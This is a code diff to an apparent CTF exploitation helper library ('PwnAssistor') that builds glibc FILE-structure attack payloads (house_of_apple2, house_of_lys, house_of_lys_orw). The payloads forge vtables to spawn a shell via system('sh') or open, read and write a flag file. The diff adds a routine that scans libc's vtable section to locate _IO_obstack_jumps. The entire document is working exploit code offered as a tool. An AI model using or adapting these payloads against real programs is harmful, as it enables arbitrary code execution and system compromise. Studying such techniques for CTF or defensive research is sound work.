@@ -1,4 +1,5 @@
 from pwn import p64, flat
+import struct
 from PwnAssistor.attacker.gadget import *
 import PwnAssistor.attacker.pwnvar as pwnvar
 
@@ -8,7 +9,7 @@ def house_of_apple2(target_addr: int):
     system = pwnvar.pwnlibc.sym['system']
     wide_addr = target_addr
     vtable_addr = target_addr
-    payload = b'   ;sh'.ljust(8, b'\x00')
+    payload = b'    sh'.ljust(8, b'\x00')
     payload = payload.ljust(0x28, b'\x00')
     payload += p64(1)
     payload = payload.ljust(0x68, b'\x00')
@@ -114,7 +115,7 @@ def house_of_lys(target_addr: int):
             0x48: target_addr + 0xa0,
             0x50: 1,
             0xa0: 0x68732f6e69622f,
-            0xd8: pwnvar.pwnlibc.sym["_IO_obstack_Jumps"] + 0x20,
+            0xd8: get_IO_obstack_Jumps() + 0x20,
             0xe0: target_addr
         },
         filler='\x00'
@@ -152,7 +153,7 @@ def house_of_lys_orw(target_addr: int, file_name: bytes = b'flag'):
             0x48: target_addr + 0xe8,
             0x50: 1,
             0xa0: file_name,
-            0xd8: pwnvar.pwnlibc.sym["_IO_obstack_Jumps"] + 0x20,
+            0xd8: get_IO_obstack_Jumps() + 0x20,
             0xe0: target_addr,
             0xe8: {
                 0x0: gg3,
@@ -164,3 +165,17 @@ def house_of_lys_orw(target_addr: int, file_name: bytes = b'flag'):
         filler='\x00'
     )
     return payload
+
+def get_IO_obstack_Jumps():
+    for i in pwnvar.pwnlibc.sections:
+        if i.name == "__libc_IO_vtables":
+            mem = pwnvar.pwnlibc.mmap
+            pos = i.header.sh_offset
+            with mem:
+                for offset in range(0, 0x1000, 8):
+                    value = []
+                    for j in range(5):
+                        value.append(struct.unpack('Q', mem[pos+offset+j*8:pos+offset+j*8+0x8])[0])
+                    if value[0] != 0 and value[4] != 0 and value[1] == value[2] == value[3] == 0:
+                        return offset+i.header.sh_addr+pwnvar.pwnlibc.address-0x18
+    raise Exception("Not found IO_obstack_Jumps")
